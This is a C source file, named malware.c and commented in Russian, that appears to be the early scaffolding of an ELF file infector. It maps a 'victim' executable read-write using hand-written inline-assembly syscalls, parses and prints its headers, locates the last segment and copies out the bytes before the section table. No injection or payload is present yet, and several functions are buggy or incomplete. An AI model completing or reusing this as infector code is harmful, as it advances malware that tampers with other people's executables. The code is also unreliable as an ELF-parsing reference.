/* Compile: gcc malware.c -o malware */
/* Usage: ./malware */
#include <sys/mman.h>
#include <sys/stat.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <elf.h>

/* ничем не отличается от структуры Elf64_Phdr, определенной в elf.h,
   но почему-то компиляторуоказывается неизвестен размер такой структуры,
   из-за чего возникают ошибки компиляции */

typedef struct Elf64_Phdr_str {
    unsigned int          p_type;       /* Segment type */
    unsigned int          p_flags;      /* Segment flags */
    unsigned long long    p_offset;     /* Segment file offset */
    unsigned long long    p_vaddr;      /* Segment virtual address */
    unsigned long long    p_paddr;      /* Segment physical address */
    unsigned long long    p_filesz;     /* Segment size in file */
    unsigned long long    p_memsz;      /* Segment size in memory */
    unsigned long long    p_align;      /* Segment alignment */
} Elf64_Phdr_str;

/* созданная по аналогичным причинам структура заголовка секции */
typedef struct Elf64_Shdr_str {
    unsigned int          sh_name;      /* Section name (string tbl index) */
    unsigned int          sh_type;      /* Section type */
    long long             sh_flags;     /* Section flags */
    unsigned long long    sh_addr;      /* Section virtual addr at execution */
    unsigned long long    sh_offset;        /* Section file offset */
    long long             sh_size;      /* Section size in bytes */
    unsigned int          sh_link;      /* Link to another section */
    unsigned int          sh_info;      /* Additional section information */
    long long             sh_addralign;     /* Section alignment */
    long long             sh_entsize;       /* Entry size if section holds table */
} Elf64_Shdr_str;

/* глобальные переменные для возвращаемых значений функций
   fopen, fread, open, read, close и mmap*/
/* это единственный способ присвоить возвращаемое ассемблерным кодом
   значение сишной переменной - даже если локальные переменные объявлены в куче,
   компилятор сначала кладет адрес переменной в стек,
   и только затем присваивает ему значение. Нам это не подходит, поскольку неизвестно,
   куда именно в стеке будет записан адрес, а взаимодествовать
   со стеком вслепую = получить segfault*/

void* return_mmap_ptr = NULL;
int return_open_fd;
int return_close_val;
int return_read_count;

/* хранит размер открытого эльфе-жертвы, нужен для fread */
long opened_file_size;

void print_elf_header_field(  Elf64_Ehdr* header_ptr );

typedef struct new_offset_and_size {
    unsigned long long offset;
    unsigned long long filesz;
} new_offset_and_size;

/* вызывает stat */
void call_stat ( const char* path_name, struct stat *stat_struct ) {
    __asm__( "mov $4, %rax\n\t"
             "syscall\n\t");
}

/* вызывает mmap */
void* call_mmap ( void *address,
                  size_t length,
                  int protect,
                  int flags,
                  int filedes,
                  off_t offset ) {

    __asm__("push %rbx \n\t"
            "push %rcx \n\t"
            "push %rdx \n\t"
            "push %rbp \n\t"
            "push %r10 \n\t"
            "push %r14 \n\t"
            "push %r15 \n\t"

            "mov %r9, %r15 \n\t"
            "mov %rsi, %r13 \n\t"
            "mov %rdi, %r12 \n\t"
            "mov %ecx, %r14d \n\t"

            "movslq %r8d, %rbp \n\t"
            "movslq %edx, %rbx \n\t"
            "movslq %r14d, %r10 \n\t"
            "mov $0x9, %eax \n\t"

            "syscall \n\t"
            "movq %rax, return_mmap_ptr(%rip) \n\t"

            "pop %r15 \n\t"
            "pop %r14 \n\t"
            "pop %r10 \n\t"
            "pop %rbp \n\t"
            "pop %rdx \n\t"
            "pop %rcx \n\t"
            "pop %rbx \n\t"
            );

    return return_mmap_ptr;
}

/* вызывает open */
int call_open (const char *filename, int flags) {

    __asm__( "mov $2, %rax\n\t"
             "syscall\n\t"
             "movq %rax, return_open_fd(%rip) \n\t"
             );

    return return_open_fd;
}

/* вызывает close */
int call_close (unsigned int fd) {

    __asm__( "mov $3, %rax\n\t"
             "syscall\n\t"
             "movq %rax, return_close_val(%rip) \n\t");

    return return_close_val;
}

/* вызывает read */
int call_read (unsigned int fd, char *buf, size_t count) {

    __asm__( "mov $0, %rax\n\t"
             "syscall\n\t"
             "movq %rax, return_read_count(%rip) \n\t"
             );
    return return_read_count;
}

/* мой вариант fopen */
/* основное отличие от библиотечного fopen состоит в том,
   что мой не принимает флаги, поскольку у меня файлы всегда будут
   открываться на чтение или запись */
void* call_fopen ( const char *filename ) {
    int fd = call_open( filename, O_RDWR );

    if ( fd < 0 ) {
        printf("fopen: Не удалось открыть файл, ошибка № %d\n",
               errno);
        return NULL;
    }

    struct stat mystruct;
    call_stat( filename, &mystruct );

    opened_file_size = mystruct.st_size;
    /* маппим файл в память */
    void* ptr = call_mmap( NULL, opened_file_size,
                           PROT_READ|PROT_WRITE, MAP_SHARED,
                           fd, 0 );

    if ( ( ptr == MAP_FAILED ) || ( ptr < 0 ) ) {
        printf("fopen: Mapping Failed, err number %d \n",
               errno);
        printf("fopen: mmap returned bad pointer: %p\n", ptr);
        return NULL;
    }
    return ptr;
}
/* мой вариант memcpy */
void* call_memcpy(void* dest, void* source, size_t n ) {

    char* d = (char*)dest;
    char* s = (char*)source;

    for (int i = 0; i < n; i++ ) {
        *d = *s;
        d++;
        s++;
    }
}

void* call_fread ( void* ptr_sourse, size_t count, size_t bytes,
                   void* ptr_dest ) {

    long readed_bytes = 0;

    for( int i = 0; i < count; i++ ) {

        /* страховка, чтоб не прочитать больше, чем есть в файле */
        if( readed_bytes >= opened_file_size ) {
            return ptr_sourse;
        }

        /* memcpy( ptr_dest, ptr_sourse, bytes ); */
        call_memcpy( ptr_dest, ptr_sourse, bytes );

        ptr_dest = ptr_dest + bytes;
        ptr_sourse = ptr_sourse + bytes;
        readed_bytes = readed_bytes + bytes;
    }
    return ptr_sourse;
}

/* распечатывает все поля заголовка эльфа */
void print_elf_header_field(  Elf64_Ehdr* header_ptr ) {
    Elf64_Ehdr header = *header_ptr;

    printf("print elf header: \n");

    printf("header.e_type : %d\n", header.e_type);
    printf("header.e_machine : %d\n", header.e_machine);
    printf("header.e_version : %ud\n", header.e_version);
    printf("header.e_entry : %p\n", (void*)header.e_entry);
    printf("header.e_phoff : %lu\n", header.e_phoff);
    printf("header.e_shoff : %lu\n", header.e_shoff);
    printf("header.e_flags : %d\n", header.e_flags);
    printf("header.e_ehsize : %d\n", header.e_ehsize);
    printf("header.e_phentsize : %d\n", header.e_phentsize);
    printf("header.e_phnum : %d\n", header.e_phnum);
    printf("header.e_shentsize : %d\n", header.e_shentsize);
    printf("header.e_shnum : %d\n", header.e_shnum);
    printf("header.e_shstrndx : %d\n", header.e_shstrndx);

    printf("\n");
}

/* печатает все поля заголовка программы - заголовков самого исполняемого кода программы*/
void print_programm_header( Elf64_Phdr_str * programm_header_ptr ) {
    struct Elf64_Phdr_str programm_header = *programm_header_ptr;

    printf("print programm header: \n");

    printf("programm_header.p_type : %d \n", programm_header.p_type);
    printf("programm_header.p_flags : %d \n", programm_header.p_flags);
    printf("programm_header.p_offset : %llu \n", programm_header.p_offset);
    printf("programm_header.p_filesz : %llu \n", programm_header.p_filesz);
    printf("programm_header.p_memsz : %llu \n", programm_header.p_memsz);
    printf("programm_header.p_vaddr : %p \n",  (void*)programm_header.p_vaddr);
    printf("programm_header.p_paddr : %p \n",  (void*)programm_header.p_paddr);
    printf("programm_header.p_align : %llu \n", programm_header.p_align);

    printf("\n");
}

void print_all_programm_headers(Elf64_Phdr_str * program_header_array, int n ) {
    for (int i = 0; i < n; i++ ) {
        print_programm_header( program_header_array );
        program_header_array++;
    }
}

/* печатает все поля заголовка секции - весь код программы поделен на секции,
   у каждой есть заголовок */
void print_section_header( Elf64_Shdr_str *section_header_ptr ) {
    struct Elf64_Shdr_str section_header = *section_header_ptr;

    printf("print section header: \n");

    printf("section_header.sh_name : %d \n", section_header.sh_name);
    printf("section_header.sh_type : %d \n", section_header.sh_type);
    printf("section_header.sh_flags : %lld \n", section_header.sh_flags);

    printf("section_header.sh_offset : %llu \n", section_header.sh_offset);
    printf("section_header.sh_size : %llu \n", section_header.sh_size);

    printf("section_header.sh_addr : %p \n",  (void*)section_header.sh_addr);
    printf("section_header.sh_link : %d \n", section_header.sh_link);
    printf("section_header.sh_info : %d \n", section_header.sh_info);

    printf("section_header.sh_addralign : %lld \n", section_header.sh_addralign);
    printf("section_header.sh_entsize : %lld \n", section_header.sh_entsize);

    printf("\n");
}

void print_all_section_headers(Elf64_Shdr_str * section_header_array, int n ) {
    for (int i = 0; i < n; i++ ) {
        print_section_header( section_header_array );
        section_header_array++;
    }
}

/* читает заголовок эльфа из памяти  */
void read_elf_header( void* mmaped_file_ptr, Elf64_Ehdr* header_struct) {
    call_fread( mmaped_file_ptr, 1, sizeof(Elf64_Ehdr), header_struct );
}

/* читает заголовок секции из памяти  */
void read_section_header( void* mmaped_file_ptr, Elf64_Shdr_str* header_struct) {
    call_fread( mmaped_file_ptr, 1, sizeof(Elf64_Shdr_str), header_struct );
}

/* читает заголовок программы из памяти  */
void read_program_header( void* mmaped_file_ptr, Elf64_Phdr_str* header_struct) {
    call_fread( mmaped_file_ptr, 1, sizeof(Elf64_Phdr_str), header_struct );
}

/* читает остальной код  */
void read_rest_code( void* mmaped_file_ptr, char* buf, int n) {
    call_fread( mmaped_file_ptr, n, sizeof(char), buf );
}

/* позволяет пропустить заданное количество символов, сдвигая указатель  */
void* miss_symbols( void* mmaped_file_ptr, long n) {
    return mmaped_file_ptr + n;
}

/* прибавляет n байт к смещению в каждом заголовке программы */
Elf64_Phdr_str* add_offset_to_programs ( int n, unsigned long long offset,
                                         Elf64_Phdr_str* array ) {
    struct Elf64_Phdr_str header;
    for( int i = 0; i < n; i++) {
        header = array[i];
        header.p_offset = header.p_offset + offset;
        array[i] = header;
    }
}

/* выгружает все заголовки кода в массив */
Elf64_Phdr_str* get_program_headers ( void* mmaped_file_ptr, int n,
                                      Elf64_Phdr_str* array_headers ) {

    call_fread( mmaped_file_ptr, n, sizeof(Elf64_Phdr_str),
                array_headers );
    return array_headers;
}

Elf64_Shdr_str* get_section_headers ( void* mmaped_file_ptr, int n,
                                      Elf64_Shdr_str* array_headers ) {

    call_fread( mmaped_file_ptr, n, sizeof(Elf64_Shdr_str),
                array_headers );
    return array_headers;
}

/* ищет заголовок последнего сегмента в массиве заголовков */
/* последним сегментом считается тот, который находится дальше всех от начала файла и */
/* имеет самый большой размер */
Elf64_Phdr_str * find_last_segment( int n, Elf64_Phdr_str * headers_array,
                                    Elf64_Phdr_str * program_header_last_segment) {

    struct Elf64_Phdr_str program_header;

    for( int i = 0; i < n; i++) {
        program_header = headers_array[i];

        if (i == 0) {
            *program_header_last_segment = program_header;

        } else if (  (*program_header_last_segment).p_offset +
                     (*program_header_last_segment).p_filesz
                     <= program_header.p_offset +  program_header.p_filesz ) {

            *program_header_last_segment = program_header;
        }
    }
    return program_header_last_segment;
}

/* сортирует пузырьком заголовки программы по размеру сегментов, которые они описывают
   (от максимального к минимальному) */
Elf64_Phdr_str* sort_program_headers (int n, Elf64_Phdr_str* array) {
    struct Elf64_Phdr_str a;
    struct Elf64_Phdr_str b;

    void bubble_sort( ) {
        for( int i = 0; i < n - 1; i++) {
            a = array[i];
            b = array[i + 1];
            if ( a.p_filesz < b.p_filesz ) {
                array[i] = b;
                array[i+1] = a;

            }
        }
    }

    Elf64_Phdr* check_array (int n, Elf64_Phdr_str* array) {
        for( int i = 0; i < n - 1; i++) {
            a = array[i];
            b = array[i + 1];

            if ( a.p_filesz < b.p_filesz ) {
                bubble_sort();
                check_array (n, array);
            }
        }
    }
    check_array (n, array);
    return array;
}

new_offset_and_size* count_new_offset_and_size_of_segments ( new_offset_and_size*
                                                             new_array,
                                                             Elf64_Phdr_str*
                                                             array_program_headers,
                                                             int n ) {
    Elf64_Phdr_str table_header;
    Elf64_Phdr_str cur_header;
    int j;

    /* считает новое смещение и размер сегмента, который описывает заголовок */
    new_offset_and_size* count( new_offset_and_size* new_array,
                                unsigned long long cur_offset,
                                unsigned long long cur_filesz ) {

        for ( int i = 0; i < j; i++ ) {

            /* сравниваем со смещением и размером таблицы заголовков */
            if ( ( table_header.p_offset + table_header.p_filesz ) >
                 cur_offset ) {

                cur_offset = ( table_header.p_offset- cur_offset ) + cur_offset;
                cur_filesz = cur_filesz - ( table_header.p_offset - cur_offset );

                /* сравниваем со смещением и размером каждого сегмента, */
                /*     который описывают заголовки */
            } else if ( ( new_array[i].offset + new_array[i].filesz ) >
                        cur_offset ) {
                cur_offset = ( new_array[i].offset - cur_offset ) + cur_offset;
                cur_filesz = cur_filesz - ( new_array[i].offset - cur_offset );

            }
        }
        /* заносим данные в массив  */
        if (cur_offset > 0 && cur_filesz > 0 ) {
            new_array[j+1].offset = cur_offset;
            new_array[j+1].filesz = cur_filesz;
            j++;
        }

        return new_array;
    }

    table_header = array_program_headers[0];

    sort_program_headers (n, array_program_headers);

    for ( int i = 1; i < n; i++ ) {

        if ( ( array_program_headers[i].p_type != 6 ) &&
             ( array_program_headers[i].p_type != 0 ) ) {
            cur_header = array_program_headers[i];

            count( new_array,
                   array_program_headers[i].p_offset,
                   array_program_headers[i].p_filesz );
        }
        return new_array;
    }
}


int main ( int argc, const char **argv ) {

    /* здесь будет объявление: */
    /*     - структора заголовка эльфа */
    /*     - структура заголовка программы */
    /*     - структура заголовка секции */
    /*     - массив заголовков программы */
    /* - структура для последнего заголовка последнего сегмента кода */
    Elf64_Ehdr elf_header;

    /* открываем файл  */
    void* file_ptr = call_fopen ( argv[1] );
    if ( NULL == file_ptr ) {
        return -1;
    }
    read_elf_header( file_ptr, &elf_header);
    print_elf_header_field( &elf_header );

    /* высчитываем, сколько байт нужно пропустить,
       чтоб добраться до таблицы заголвоков */
    long program_table_offset = elf_header.e_phoff;
    void* prog_header_ptr = miss_symbols(file_ptr, program_table_offset);


    /* выгружаем все заголовки программы в массив */
    Elf64_Phdr_str array_program_headers [elf_header.e_phnum];
    get_program_headers ( prog_header_ptr, elf_header.e_phnum,
                          array_program_headers );

    /* временно включаем печать, чтоб убедиться, что все данные прочитаны верно */
    print_all_programm_headers(array_program_headers, elf_header.e_phnum );

    sort_program_headers (elf_header.e_phnum, array_program_headers);
    printf("sorted program headers array : \n");
    print_all_programm_headers(array_program_headers, elf_header.e_phnum );

    /* высчитываем, сколько байт нужно пропустить,
       чтоб добраться до таблицы секций */
    long section_table_offset = elf_header.e_shoff;
    void* section_header_ptr = miss_symbols(file_ptr, section_table_offset);

    /* выгружаем все заголовки секций в массив */
    Elf64_Shdr_str array_section_headers [elf_header.e_shnum];
    get_section_headers ( section_header_ptr, elf_header.e_shnum,
                          array_section_headers );

    /* print_all_section_headers(array_section_headers, elf_header.e_shnum ); */

    /* находим заголовок последнего сегмента кода */
    Elf64_Phdr_str last_segment_header;
    find_last_segment( elf_header.e_phnum, array_program_headers,
                       &last_segment_header);

    printf("\nprint header of last segment : \n");
    print_programm_header( &last_segment_header );

    /* теперь считаем  конец последнего сегмента кода -
       это его смещение + размер в файле */
    long last_segment_end = last_segment_header.p_offset + last_segment_header.p_filesz;

    /* получаем размер кода-жертвы,
       который находится между концом кода и началом таблицы секций */
    long code_size = section_table_offset - last_segment_end;
    /* выгружаем этот код в отдельный буфер */
    char rest_code[code_size];
    read_rest_code( file_ptr + last_segment_end, rest_code, code_size);
    return 0;
}
